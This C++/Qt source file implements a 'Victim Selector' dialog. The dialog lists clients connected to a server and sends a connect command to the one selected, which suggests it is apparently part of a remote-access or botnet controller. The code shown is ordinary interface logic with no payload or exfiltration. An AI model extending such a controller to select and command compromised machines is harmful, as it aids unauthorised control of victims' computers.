#include "connectc.h"
#include "ui_connectc.h"


//***********************************************************************************************
//***********************************************************************************************
//The constructor for the connectc class

connectc::connectc(server *recieved, bool disconnected, QWidget *parent) :
    QWidget(parent), mainServer(recieved),
    ui(new Ui::connectc)
{    
    this->setAttribute(Qt::WA_DeleteOnClose);
    ui->setupUi(this);
    this->setWindowTitle("Victim Selector");
    this->setWindowFlags(Qt::WindowCloseButtonHint);
    this->setWindowModality(Qt::ApplicationModal);
    this->setFixedHeight(this->height());
    this->setFixedWidth(this->width());

    connect(mainServer, SIGNAL(addListMember(QString)), this, SLOT(newClientConnected(QString)));
    connect(mainServer, SIGNAL(removeListMember(QString)), this, SLOT(clientDisconnected(QString)));

    QVector<QString> nameList(mainServer->getList());
    QString *nameListData = nameList.data();

    for (int i = 0; i < nameList.size(); i++)
    {
        if(nameListData[i] != "Default")
        {
            clientList.append(new QListWidgetItem(nameListData[i]));
            ui->listWidget->insertItem(i, clientList.last());
        }
    }

    if(disconnected)
    {
        mainServer->closeConnection();
        connectedTo = "None";
    }


    if(clientList.size() == 0)
        ui->pushButton->setDisabled(true);
}



//***********************************************************************************************
//***********************************************************************************************
//The function used to send the 'connect' command to the server

void connectc::on_pushButton_clicked()
{
    if(ui->listWidget->currentItem() != NULL)
    {
        mainServer->connectTo(((ui->listWidget->currentItem())->text()));
        connectedTo = (ui->listWidget->currentItem())->text();
        emit changeButtonText();
        this->deleteLater();
        this->close();
    }
}




//***********************************************************************************************
//***********************************************************************************************
//Functions which handle the addition and removal of items in the list and the LW appearance

void connectc::newClientConnected(QString clientName)
{
    clientList.append(new QListWidgetItem(clientName));
    ui->listWidget->insertItem(ui->listWidget->count(), clientList.last());

    ui->pushButton->setEnabled(true);
}


void connectc::clientDisconnected(QString clientName)
{
    for (int i = 0; i < clientList.size(); i++)
    {
        if(clientList[i]->text() == clientName)
        {
            ui->listWidget->takeItem(i);
            delete clientList[i];
            clientList.removeAt(i);
        }
    }

    if(clientList.size() == 0)
        ui->pushButton->setDisabled(true);
}




//***********************************************************************************************
//***********************************************************************************************
//The destructor of the class

connectc::~connectc()
{
    delete ui;
}


void connectc::on_listWidget_itemDoubleClicked(QListWidgetItem *item)
{
    mainServer->connectTo(item->text());
    connectedTo = item->text();
    emit changeButtonText();
    this->deleteLater();
    this->close();
}
